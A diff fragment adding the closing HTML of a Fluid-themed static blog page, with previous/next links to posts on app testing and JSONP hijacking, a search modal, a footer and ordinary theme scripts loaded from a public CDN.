+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">以soul为样本的APP测试总结（待详细）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/08/12/jsonp-study/" title="对jsonp劫持的一次简单了解">
+                        <span class="hidden-mobile">对jsonp劫持的一次简单了解</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
